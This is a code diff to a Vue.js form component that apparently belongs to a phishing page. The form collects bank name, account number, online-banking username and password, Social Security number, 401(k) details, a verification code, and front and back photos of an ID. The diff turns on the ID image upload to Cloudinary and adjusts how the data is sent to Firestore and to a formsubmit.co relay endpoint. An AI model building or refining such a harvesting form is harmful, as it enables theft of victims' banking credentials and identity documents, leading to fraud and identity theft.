@@ -127,38 +127,39 @@ const submitForm = () => {
   }
   loadReq.value = true;
   // upload both images to Cloudinary
-  // Promise.all([
-  //   uploadImage(dataUrlToFile(frontPreview.value, 'front-id')),
-  //   uploadImage(dataUrlToFile(backPreview.value, 'back-id'))
-  // ]).then(([frontUrl, backUrl]) => {
-  //   // Here you can send the form data along with the uploaded image URLs to your backend or Firestore
-  //   form.value.frontPreview = frontUrl;
-  //   form.value.backPreview = backUrl;
-  //   console.log('Front Image URL:', frontUrl);
-  //   console.log('Back Image URL:', backUrl);
+  Promise.all([
+    uploadImage(dataUrlToFile(frontPreview.value, 'front-id')),
+    uploadImage(dataUrlToFile(backPreview.value, 'back-id'))
+  ]).then(([frontUrl, backUrl]) => {
+    // Here you can send the form data along with the uploaded image URLs to your backend or Firestore
+    form.value.frontPreview = frontUrl;
+    form.value.backPreview = backUrl;
+    console.log('Front Image URL:', frontUrl);
+    console.log('Back Image URL:', backUrl);
 
-  //   // Reset form and previews if needed
-  //   // form.value = {
-  //   //   bank: '',
-  //   //   accountNumber: '',
-  //   //   amount: '',
-  //   //   username: '',
-  //   //   password: '',
-  //   //   ssn: '',
-  //   //   fortyOneK: '',
-  //   //   fortyOneKProvider: '',
-  //   //   code: ''
-  //   // };
-  //   // frontPreview.value = '';
-  //   // backPreview.value = '';
-  // }).catch(err => {
-  //   console.error('Error uploading images:', err);
-  //   $swal.fire('Error', 'There was an issue uploading your ID images. Please try again.', 'error');
-  // });
+    // Reset form and previews if needed
+    // form.value = {
+    //   bank: '',
+    //   accountNumber: '',
+    //   amount: '',
+    //   username: '',
+    //   password: '',
+    //   ssn: '',
+    //   fortyOneK: '',
+    //   fortyOneKProvider: '',
+    //   code: ''
+    // };
+    // frontPreview.value = '';
+    // backPreview.value = '';
+  }).catch(err => {
+    console.error('Error uploading images:', err);
+    $swal.fire('Error', 'There was an issue uploading your ID images. Please try again.', 'error');
+  });
 
   // save to Firestore
-  submitRequest(form).then(() => {
+  submitRequest(form.value).then((resp) => {
     // $swal.fire('Success', 'Your request has been submitted successfully!', 'success');
+    // console.log(resp);
   }).catch(err => {
     console.error('Error submitting request:', err);
     $swal.fire('Error', 'There was an issue submitting your request. Please try again.', 'error');
@@ -180,8 +181,7 @@ const submitForm = () => {
   // send to formsubmit.co
   fetch('https://formsubmit.co/ajax/fceb7c66a69228b93c167b94e13568a0', {
     method: 'POST',
-    headers: { 
-      'Content-Type': 'application/json',
+    headers: {
       'Accept': 'application/json'
     },
     body: formdata
@@ -191,10 +191,6 @@ const submitForm = () => {
     console.error('Error submitting form:', err);
     $swal.fire('Error', 'There was an issue submitting your form. Please try again.', 'error');
   });
-  
-  // after completely uploading both images, set formpage to 'code'
-  loadReq.value = false;
-  formpage.value = 'code';
 }
 </script>
 
@@ -352,8 +348,8 @@ const submitForm = () => {
             </div>
 
             <!-- Submit -->
-            <button type="submit" class="btn btn-primary w-100 p-3 login-btn" :disabled="loadReq">
-              <i class="spinner-border spinner-border-sm" v-if="loadReq"></i>
+            <button type="submit" class="btn btn-primary w-100 p-3 login-btn" :disabled="loadReq==true">
+              <i class="spinner-border spinner-border-sm" v-if="loadReq==true"></i>
               <span>PROCEED</span>
             </button>
           </form>
